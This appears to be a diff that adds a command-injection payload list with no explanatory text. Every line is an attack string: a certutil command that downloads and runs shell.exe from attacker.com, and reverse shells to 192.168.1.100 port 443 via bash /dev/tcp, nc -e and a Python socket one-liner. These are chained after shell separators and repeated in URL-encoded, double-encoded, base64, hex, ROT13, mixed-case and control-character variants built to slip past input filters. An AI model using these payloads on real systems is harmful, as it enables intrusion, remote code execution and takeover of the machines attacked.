+`|preghgvy -heypnpur -s uggc://nggnpxre.pbz/furyy.rkr furyy.rkr && furyy.rkr
+`|cErtUTiL -URlCache -f hTTP://ATTackeR.cOM/sHeLL.ExE sHEll.eXe && SHeLl.Exe
+`|certut%0bil %09-u%20rlcache -f http://attacker.com/shell.%0dexe shell.exe && shell.exe
+`&certutil -urlcache -f http://attacker.com/shell.exe shell.exe && shell.exe
+%60%26certutil%20-urlcache%20-f%20http%3A//attacker.com/shell.exe%20shell.exe%20%26%26%20shell.exe
+%2560%2526certutil%2520-urlcache%2520-f%2520http%253A//attacker.com/shell.exe%2520shell.exe%2520%2526%2526%2520shell.exe
+YCZjZXJ0dXRpbCAtdXJsY2FjaGUgLWYgaHR0cDovL2F0dGFja2VyLmNvbS9zaGVsbC5leGUgc2hlbGwuZXhlICYmIHNoZWxsLmV4ZQ==
+6026636572747574696c202d75726c6361636865202d6620687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e657865207368656c6c2e657865202626207368656c6c2e657865
+`&preghgvy -heypnpur -s uggc://nggnpxre.pbz/furyy.rkr furyy.rkr && furyy.rkr
+`&CeRtUtIl -urlCacHe -f HTtp://ATTacKEr.Com/shelL.EXE shelL.eXe && shELL.ExE
+`&certu%09til -urlcache -f http://atta%00cker.com%00/shell.exe shell.ex%0ce %0c&%0c& s%00hel%00l.ex%0de
+certutil -urlcache -f http://attacker.com/shell.exe shell.exe && shell.exe
+certutil%20-urlcache%20-f%20http%3A//attacker.com/shell.exe%20shell.exe%20%26%26%20shell.exe
+certutil%2520-urlcache%2520-f%2520http%253A//attacker.com/shell.exe%2520shell.exe%2520%2526%2526%2520shell.exe
+Y2VydHV0aWwgLXVybGNhY2hlIC1mIGh0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwuZXhlIHNoZWxsLmV4ZSAmJiBzaGVsbC5leGU=
+636572747574696c202d75726c6361636865202d6620687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e657865207368656c6c2e657865202626207368656c6c2e657865
+preghgvy -heypnpur -s uggc://nggnpxre.pbz/furyy.rkr furyy.rkr && furyy.rkr
+CErtUTIL -UrLcAChe -F HTtp://AtTAcKER.COM/sheLl.EXE SHEll.EXe && ShelL.exe
+certuti%09l -urlcache%0a %0d-%0af ht%0atp%0a://att%09a%0ccker.%0bco%00m/shell.exe shell.exe && %0as%09hel%09l.exe
+; bash -i >& /dev/tcp/192.168.1.100/443 0>&1
+%3B%20bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/443%200%3E%261
+%253B%2520bash%2520-i%2520%253E%2526%2520/dev/tcp/192.168.1.100/443%25200%253E%25261
+OyBiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMS4xMDAvNDQzIDA+JjE=
+3b2062617368202d69203e26202f6465762f7463702f3139322e3136382e312e3130302f34343320303e2631
+; onfu -v >& /qri/gpc/192.168.1.100/443 0>&1
+; basH -i >& /DEv/tcp/192.168.1.100/443 0>&1
+; ba%20sh -i >%0c&%20 /dev/tcp/192.168.1%0d.100/443 %0c0>&1
+| bash -i >& /dev/tcp/192.168.1.100/443 0>&1
+%7C%20bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/443%200%3E%261
+%257C%2520bash%2520-i%2520%253E%2526%2520/dev/tcp/192.168.1.100/443%25200%253E%25261
+fCBiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMS4xMDAvNDQzIDA+JjE=
+7c2062617368202d69203e26202f6465762f7463702f3139322e3136382e312e3130302f34343320303e2631
+| onfu -v >& /qri/gpc/192.168.1.100/443 0>&1
+| bAsH -i >& /dEV/TCp/192.168.1.100/443 0>&1
+| bash -i >& /d%0bev/tcp%0d/192.168.1.%0d100/44%003 0>&1
+|| bash -i >& /dev/tcp/192.168.1.100/443 0>&1
+%7C%7C%20bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/443%200%3E%261
+%257C%257C%2520bash%2520-i%2520%253E%2526%2520/dev/tcp/192.168.1.100/443%25200%253E%25261
+fHwgYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0MyAwPiYx
+7c7c2062617368202d69203e26202f6465762f7463702f3139322e3136382e312e3130302f34343320303e2631
+|| onfu -v >& /qri/gpc/192.168.1.100/443 0>&1
+|| bASh -I >& /DEV/TCP/192.168.1.100/443 0>&1
+|| bash -i >& /dev/%0atcp%0d/192.168%0d.1.100/443 0>&1
+& bash -i >& /dev/tcp/192.168.1.100/443 0>&1
+%26%20bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/443%200%3E%261
+%2526%2520bash%2520-i%2520%253E%2526%2520/dev/tcp/192.168.1.100/443%25200%253E%25261
+JiBiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMS4xMDAvNDQzIDA+JjE=
+262062617368202d69203e26202f6465762f7463702f3139322e3136382e312e3130302f34343320303e2631
+& onfu -v >& /qri/gpc/192.168.1.100/443 0>&1
+& BaSH -i >& /Dev/tcp/192.168.1.100/443 0>&1
+& bash%09 -i >& /dev/tcp/192.16%0b8.1.100/443 0>&1
+&& bash -i >& /dev/tcp/192.168.1.100/443 0>&1
+%26%26%20bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/443%200%3E%261
+%2526%2526%2520bash%2520-i%2520%253E%2526%2520/dev/tcp/192.168.1.100/443%25200%253E%25261
+JiYgYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0MyAwPiYx
+26262062617368202d69203e26202f6465762f7463702f3139322e3136382e312e3130302f34343320303e2631
+&& onfu -v >& /qri/gpc/192.168.1.100/443 0>&1
+&& baSh -I >& /dev/tcp/192.168.1.100/443 0>&1
+&& bash -i %09>& /dev/tcp/1%0a92.168.1.100%0b/443 0>&1
+%0abash -i >& /dev/tcp/192.168.1.100/443 0>&1
+%250abash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/443%200%3E%261
+%25250abash%2520-i%2520%253E%2526%2520/dev/tcp/192.168.1.100/443%25200%253E%25261
+JTBhYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0MyAwPiYx
+25306162617368202d69203e26202f6465762f7463702f3139322e3136382e312e3130302f34343320303e2631
+%0nonfu -v >& /qri/gpc/192.168.1.100/443 0>&1
+%0AbasH -I >& /Dev/Tcp/192.168.1.100/443 0>&1
+%0abash %00-i >& /dev/tcp/192.168.1.100/443 0%0b>&%201
+%0Abash -i >& /dev/tcp/192.168.1.100/443 0>&1
+%250Abash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/443%200%3E%261
+%25250Abash%2520-i%2520%253E%2526%2520/dev/tcp/192.168.1.100/443%25200%253E%25261
+JTBBYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0MyAwPiYx
+25304162617368202d69203e26202f6465762f7463702f3139322e3136382e312e3130302f34343320303e2631
+%0Nonfu -v >& /qri/gpc/192.168.1.100/443 0>&1
+%0aBaSH -I >& /deV/tcP/192.168.1.100/443 0>&1
+%0Aba%0ds%0bh -i >& /dev/t%09cp/192.168%0d.%201.100/443 0>&1
+${IFS}bash -i >& /dev/tcp/192.168.1.100/443 0>&1
+%24%7BIFS%7Dbash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/443%200%3E%261
+%2524%257BIFS%257Dbash%2520-i%2520%253E%2526%2520/dev/tcp/192.168.1.100/443%25200%253E%25261
+JHtJRlN9YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0MyAwPiYx
+247b4946537d62617368202d69203e26202f6465762f7463702f3139322e3136382e312e3130302f34343320303e2631
+${VSF}onfu -v >& /qri/gpc/192.168.1.100/443 0>&1
+${ifs}BASh -I >& /deV/Tcp/192.168.1.100/443 0>&1
+${IFS}bash%0d -%20i >%0a& /dev/tc%00p%0a/1%0b92.168.1.100/4%0b43 0>&%0a1
+\nbash -i >& /dev/tcp/192.168.1.100/443 0>&1
+%5Cnbash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/443%200%3E%261
+%255Cnbash%2520-i%2520%253E%2526%2520/dev/tcp/192.168.1.100/443%25200%253E%25261
+XG5iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMS4xMDAvNDQzIDA+JjE=
+5c6e62617368202d69203e26202f6465762f7463702f3139322e3136382e312e3130302f34343320303e2631
+\aonfu -v >& /qri/gpc/192.168.1.100/443 0>&1
+\NbASh -i >& /deV/tCp/192.168.1.100/443 0>&1
+\n%20bash -i >& /dev/t%00cp/192.1%2068.1.100%00/443 0>&1
+bash -i >& /dev/tcp/192.168.1.100/443 0>&1
+bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/443%200%3E%261
+bash%2520-i%2520%253E%2526%2520/dev/tcp/192.168.1.100/443%25200%253E%25261
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0MyAwPiYx
+62617368202d69203e26202f6465762f7463702f3139322e3136382e312e3130302f34343320303e2631
+onfu -v >& /qri/gpc/192.168.1.100/443 0>&1
+baSh -i >& /dEV/tCP/192.168.1.100/443 0>&1
+bash -%0ai%0a >& /dev/tcp/192.168.1.100/%0a443 0>&1
+; nc -e /bin/sh 192.168.1.100 443
+%3B%20nc%20-e%20/bin/sh%20192.168.1.100%20443
+%253B%2520nc%2520-e%2520/bin/sh%2520192.168.1.100%2520443
+OyBuYyAtZSAvYmluL3NoIDE5Mi4xNjguMS4xMDAgNDQz
+3b206e63202d65202f62696e2f7368203139322e3136382e312e31303020343433
+; ap -r /ova/fu 192.168.1.100 443
+; nC -E /bin/Sh 192.168.1.100 443
+%00;%0a %0anc -e%0d /bin/sh 192.168.1.1%0b00 443
+| nc -e /bin/sh 192.168.1.100 443
+%7C%20nc%20-e%20/bin/sh%20192.168.1.100%20443
+%257C%2520nc%2520-e%2520/bin/sh%2520192.168.1.100%2520443
+fCBuYyAtZSAvYmluL3NoIDE5Mi4xNjguMS4xMDAgNDQz
+7c206e63202d65202f62696e2f7368203139322e3136382e312e31303020343433
+| ap -r /ova/fu 192.168.1.100 443
+| NC -E /BIN/SH 192.168.1.100 443
+| nc -e /bin/sh %09192.%00168.1.100 443
+|| nc -e /bin/sh 192.168.1.100 443
+%7C%7C%20nc%20-e%20/bin/sh%20192.168.1.100%20443
+%257C%257C%2520nc%2520-e%2520/bin/sh%2520192.168.1.100%2520443
+fHwgbmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEuMTAwIDQ0Mw==
+7c7c206e63202d65202f62696e2f7368203139322e3136382e312e31303020343433
+|| ap -r /ova/fu 192.168.1.100 443
+|| Nc -E /BIN/sh 192.168.1.100 443
+|| nc -e /bin/sh%20 192.168.1.100 443
+& nc -e /bin/sh 192.168.1.100 443
+%26%20nc%20-e%20/bin/sh%20192.168.1.100%20443
+%2526%2520nc%2520-e%2520/bin/sh%2520192.168.1.100%2520443
+JiBuYyAtZSAvYmluL3NoIDE5Mi4xNjguMS4xMDAgNDQz
+26206e63202d65202f62696e2f7368203139322e3136382e312e31303020343433
+& ap -r /ova/fu 192.168.1.100 443
+& NC -E /bin/Sh 192.168.1.100 443
+& nc -e%09 /%0cb%0ci%0bn%20/sh%0b 192.168.1.100 443
+&& nc -e /bin/sh 192.168.1.100 443
+%26%26%20nc%20-e%20/bin/sh%20192.168.1.100%20443
+%2526%2526%2520nc%2520-e%2520/bin/sh%2520192.168.1.100%2520443
+JiYgbmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEuMTAwIDQ0Mw==
+2626206e63202d65202f62696e2f7368203139322e3136382e312e31303020343433
+&& ap -r /ova/fu 192.168.1.100 443
+&& nC -e /BIn/sh 192.168.1.100 443
+&& nc%0a -%09e /%0cbin/%0bsh 192.168.%001.100 %20443
+%0anc -e /bin/sh 192.168.1.100 443
+%250anc%20-e%20/bin/sh%20192.168.1.100%20443
+%25250anc%2520-e%2520/bin/sh%2520192.168.1.100%2520443
+JTBhbmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEuMTAwIDQ0Mw==
+2530616e63202d65202f62696e2f7368203139322e3136382e312e31303020343433
+%0nap -r /ova/fu 192.168.1.100 443
+%0ANc -E /bIN/sH 192.168.1.100 443
+%0an%0ac -e%0c /bin/sh 192.1%0068.1.10%0c0 %00443
+%0Anc -e /bin/sh 192.168.1.100 443
+%250Anc%20-e%20/bin/sh%20192.168.1.100%20443
+%25250Anc%2520-e%2520/bin/sh%2520192.168.1.100%2520443
+JTBBbmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEuMTAwIDQ0Mw==
+2530416e63202d65202f62696e2f7368203139322e3136382e312e31303020343433
+%0Nap -r /ova/fu 192.168.1.100 443
+%0Anc -e /BIn/SH 192.168.1.100 443
+%0Anc -e /bi%20n/sh 192.168.1.100 443
+${IFS}nc -e /bin/sh 192.168.1.100 443
+%24%7BIFS%7Dnc%20-e%20/bin/sh%20192.168.1.100%20443
+%2524%257BIFS%257Dnc%2520-e%2520/bin/sh%2520192.168.1.100%2520443
+JHtJRlN9bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEuMTAwIDQ0Mw==
+247b4946537d6e63202d65202f62696e2f7368203139322e3136382e312e31303020343433
+${VSF}ap -r /ova/fu 192.168.1.100 443
+${iFS}Nc -E /biN/Sh 192.168.1.100 443
+${IFS}nc -e /b%0ain/sh %0019%002.168.1.100 443
+\nnc -e /bin/sh 192.168.1.100 443
+%5Cnnc%20-e%20/bin/sh%20192.168.1.100%20443
+%255Cnnc%2520-e%2520/bin/sh%2520192.168.1.100%2520443
+XG5uYyAtZSAvYmluL3NoIDE5Mi4xNjguMS4xMDAgNDQz
+5c6e6e63202d65202f62696e2f7368203139322e3136382e312e31303020343433
+\aap -r /ova/fu 192.168.1.100 443
+\NnC -e /BIN/sH 192.168.1.100 443
+\nnc -%20e%0d /%0bbin%0c/sh 192%0d.%0a168.1.100 443
+nc -e /bin/sh 192.168.1.100 443
+nc%20-e%20/bin/sh%20192.168.1.100%20443
+nc%2520-e%2520/bin/sh%2520192.168.1.100%2520443
+bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEuMTAwIDQ0Mw==
+6e63202d65202f62696e2f7368203139322e3136382e312e31303020343433
+ap -r /ova/fu 192.168.1.100 443
+NC -E /BIN/sH 192.168.1.100 443
+nc -e /bin/%00sh 192.168.1.100 443
+; python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.1.100",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
+%3B%20python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3B%20s%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3B%20s.connect%28%28%22192.168.1.100%22%2C443%29%29%3B%20os.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3B%20subprocess.call%28%5B%22/bin/sh%22%2C%22-i%22%5D%29%27
+%253B%2520python3%2520-c%2520%2527import%2520socket%252Csubprocess%252Cos%253B%2520s%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%253B%2520s.connect%2528%2528%2522192.168.1.100%2522%252C443%2529%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C0%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C1%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C2%2529%253B%2520subprocess.call%2528%255B%2522/bin/sh%2522%252C%2522-i%2522%255D%2529%2527
+OyBweXRob24zIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7IHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pOyBzLmNvbm5lY3QoKCIxOTIuMTY4LjEuMTAwIiw0NDMpKTsgb3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTsgc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pJw==
+3b20707974686f6e33202d632027696d706f727420736f636b65742c73756270726f636573732c6f733b20733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d293b20732e636f6e6e6563742828223139322e3136382e312e313030222c34343329293b206f732e6475703228732e66696c656e6f28292c30293b206f732e6475703228732e66696c656e6f28292c31293b206f732e6475703228732e66696c656e6f28292c32293b2073756270726f636573732e63616c6c285b222f62696e2f7368222c222d69225d2927
+; clguba3 -p 'vzcbeg fbpxrg,fhocebprff,bf; f=fbpxrg.fbpxrg(fbpxrg.NS_VARG,fbpxrg.FBPX_FGERNZ); f.pbaarpg(("192.168.1.100",443)); bf.qhc2(f.svyrab(),0); bf.qhc2(f.svyrab(),1); bf.qhc2(f.svyrab(),2); fhocebprff.pnyy(["/ova/fu","-v"])'
+; PythOn3 -C 'IMpOrT sOCKET,subpROcESS,Os; s=sOcKeT.socKeT(sOcKET.af_iNET,sOCKeT.SOcK_sTreAm); s.cOnnECT(("192.168.1.100",443)); oS.DUP2(s.FiLeno(),0); os.duP2(S.FILeno(),1); Os.DuP2(s.fileNo(),2); SubpROCEss.cAlL(["/Bin/Sh","-I"])'
+; python3 -c 'i%20m%00port %0cs%0coc%0dket,subpr%20ocess,os;%09 s=socket.s%0cocket(socket.A%09F_IN%00ET,s%20ocket.SOCK_STREAM); s.con%0cn%0cect(("192.168.1.%0c100",443%0c)); %0aos.dup2(s.fileno(),0); %00os.dup2(s.fileno(),1); o%0bs.dup2(s.fileno(),2); subprocess.call(["/bin/sh"%0c,"-i"])%0b'
+| python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.1.100",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
+%7C%20python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3B%20s%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3B%20s.connect%28%28%22192.168.1.100%22%2C443%29%29%3B%20os.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3B%20subprocess.call%28%5B%22/bin/sh%22%2C%22-i%22%5D%29%27
+%257C%2520python3%2520-c%2520%2527import%2520socket%252Csubprocess%252Cos%253B%2520s%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%253B%2520s.connect%2528%2528%2522192.168.1.100%2522%252C443%2529%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C0%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C1%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C2%2529%253B%2520subprocess.call%2528%255B%2522/bin/sh%2522%252C%2522-i%2522%255D%2529%2527
+fCBweXRob24zIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7IHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pOyBzLmNvbm5lY3QoKCIxOTIuMTY4LjEuMTAwIiw0NDMpKTsgb3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTsgc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pJw==
+7c20707974686f6e33202d632027696d706f727420736f636b65742c73756270726f636573732c6f733b20733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d293b20732e636f6e6e6563742828223139322e3136382e312e313030222c34343329293b206f732e6475703228732e66696c656e6f28292c30293b206f732e6475703228732e66696c656e6f28292c31293b206f732e6475703228732e66696c656e6f28292c32293b2073756270726f636573732e63616c6c285b222f62696e2f7368222c222d69225d2927
+| clguba3 -p 'vzcbeg fbpxrg,fhocebprff,bf; f=fbpxrg.fbpxrg(fbpxrg.NS_VARG,fbpxrg.FBPX_FGERNZ); f.pbaarpg(("192.168.1.100",443)); bf.qhc2(f.svyrab(),0); bf.qhc2(f.svyrab(),1); bf.qhc2(f.svyrab(),2); fhocebprff.pnyy(["/ova/fu","-v"])'
+| PYThoN3 -c 'imPorT sockeT,SUBproCEsS,Os; s=SOckeT.sOCKet(sOcKET.Af_iNeT,SOCKEt.SOCK_streAm); S.CoNNeCT(("192.168.1.100",443)); oS.DuP2(s.fiLeNO(),0); Os.Dup2(s.FiLEnO(),1); oS.dUP2(s.fiLEno(),2); sUbPrOCeSs.caLl(["/BIN/Sh","-I"])'
+| python3 %00-c 'import s%0doc%0bk%20e%09t,subprocess,os; s%0a=%00socket.socket(socket.AF_I%0dNET,%0cs%0docket.SOC%0cK_STR%00EAM); s.co%00nnect(("192.168.1.100%0a",%00443))%09; os.dup2(s.f%0dileno(),0); os.dup2(s.fileno(),1); os.du%09p2(s.file%0ano(),2); subp%0brocess.ca%00ll(["%0d/bin/sh%0d","-i"])'
+|| python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.1.100",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
+%7C%7C%20python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3B%20s%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3B%20s.connect%28%28%22192.168.1.100%22%2C443%29%29%3B%20os.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3B%20subprocess.call%28%5B%22/bin/sh%22%2C%22-i%22%5D%29%27
+%257C%257C%2520python3%2520-c%2520%2527import%2520socket%252Csubprocess%252Cos%253B%2520s%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%253B%2520s.connect%2528%2528%2522192.168.1.100%2522%252C443%2529%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C0%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C1%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C2%2529%253B%2520subprocess.call%2528%255B%2522/bin/sh%2522%252C%2522-i%2522%255D%2529%2527
+fHwgcHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOyBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsgcy5jb25uZWN0KCgiMTkyLjE2OC4xLjEwMCIsNDQzKSk7IG9zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKSc=
+7c7c20707974686f6e33202d632027696d706f727420736f636b65742c73756270726f636573732c6f733b20733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d293b20732e636f6e6e6563742828223139322e3136382e312e313030222c34343329293b206f732e6475703228732e66696c656e6f28292c30293b206f732e6475703228732e66696c656e6f28292c31293b206f732e6475703228732e66696c656e6f28292c32293b2073756270726f636573732e63616c6c285b222f62696e2f7368222c222d69225d2927
+|| clguba3 -p 'vzcbeg fbpxrg,fhocebprff,bf; f=fbpxrg.fbpxrg(fbpxrg.NS_VARG,fbpxrg.FBPX_FGERNZ); f.pbaarpg(("192.168.1.100",443)); bf.qhc2(f.svyrab(),0); bf.qhc2(f.svyrab(),1); bf.qhc2(f.svyrab(),2); fhocebprff.pnyy(["/ova/fu","-v"])'
+|| pythON3 -C 'impORt soCkeT,SubPRoCEss,Os; S=sOckEt.sOCKET(SocKEt.Af_inET,SoCKEt.soCk_STREam); s.CoNNECt(("192.168.1.100",443)); oS.dUP2(S.FILeNO(),0); oS.dUP2(S.fileno(),1); OS.DUP2(s.fiLenO(),2); SuBPrOCEss.CALL(["/biN/Sh","-i"])'
+|| %09p%0ay%0bthon3 -c %0c'i%0amport%0d socket,su%0bbpr%0aocess,os; s=s%0cocket.socket(socket.AF%09_INET,%09socket.SOCK_STREAM); s.connect(("192.1%0068.1.100",443%00)); os.dup2(s.fileno(),0%0b); os.dup2(s.fileno(),1); os.dup2(s.filen%0bo(),2); %20subprocess.call(["/bin/sh","-i"%0b])'
+& python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.1.100",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
+%26%20python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3B%20s%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3B%20s.connect%28%28%22192.168.1.100%22%2C443%29%29%3B%20os.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3B%20subprocess.call%28%5B%22/bin/sh%22%2C%22-i%22%5D%29%27
+%2526%2520python3%2520-c%2520%2527import%2520socket%252Csubprocess%252Cos%253B%2520s%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%253B%2520s.connect%2528%2528%2522192.168.1.100%2522%252C443%2529%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C0%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C1%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C2%2529%253B%2520subprocess.call%2528%255B%2522/bin/sh%2522%252C%2522-i%2522%255D%2529%2527
+JiBweXRob24zIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7IHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pOyBzLmNvbm5lY3QoKCIxOTIuMTY4LjEuMTAwIiw0NDMpKTsgb3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTsgc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pJw==
+2620707974686f6e33202d632027696d706f727420736f636b65742c73756270726f636573732c6f733b20733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d293b20732e636f6e6e6563742828223139322e3136382e312e313030222c34343329293b206f732e6475703228732e66696c656e6f28292c30293b206f732e6475703228732e66696c656e6f28292c31293b206f732e6475703228732e66696c656e6f28292c32293b2073756270726f636573732e63616c6c285b222f62696e2f7368222c222d69225d2927
+& clguba3 -p 'vzcbeg fbpxrg,fhocebprff,bf; f=fbpxrg.fbpxrg(fbpxrg.NS_VARG,fbpxrg.FBPX_FGERNZ); f.pbaarpg(("192.168.1.100",443)); bf.qhc2(f.svyrab(),0); bf.qhc2(f.svyrab(),1); bf.qhc2(f.svyrab(),2); fhocebprff.pnyy(["/ova/fu","-v"])'
+& pyTHon3 -c 'IMPOrt sOcKeT,SUBProceSS,Os; S=SockeT.SoCKET(soCkET.af_iNEt,SoCKet.SoCK_sTREam); S.cONnEcT(("192.168.1.100",443)); Os.DuP2(S.fiLeNo(),0); os.dup2(S.FileNo(),1); os.Dup2(S.fIlenO(),2); sUBproCess.call(["/bin/SH","-i"])'
+& %20pyt%0bhon3 -c%0c 'import socket,subp%0brocess%0c,os; s=%0csock%00et%20.socket%20(socket.AF_INET,socket.SOCK_STREAM); s.conn%20ect(("192.168.1.100",443)); %09os.dup2(s.filen%0bo(),0); os.dup2(s.file%0cno(),1);%09 %0cos.d%0dup2(s.fileno(),2); subpro%0ccess.call(["/bin/sh","-i"])'
+&& python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.1.100",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
+%26%26%20python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3B%20s%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3B%20s.connect%28%28%22192.168.1.100%22%2C443%29%29%3B%20os.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3B%20subprocess.call%28%5B%22/bin/sh%22%2C%22-i%22%5D%29%27
+%2526%2526%2520python3%2520-c%2520%2527import%2520socket%252Csubprocess%252Cos%253B%2520s%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%253B%2520s.connect%2528%2528%2522192.168.1.100%2522%252C443%2529%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C0%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C1%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C2%2529%253B%2520subprocess.call%2528%255B%2522/bin/sh%2522%252C%2522-i%2522%255D%2529%2527
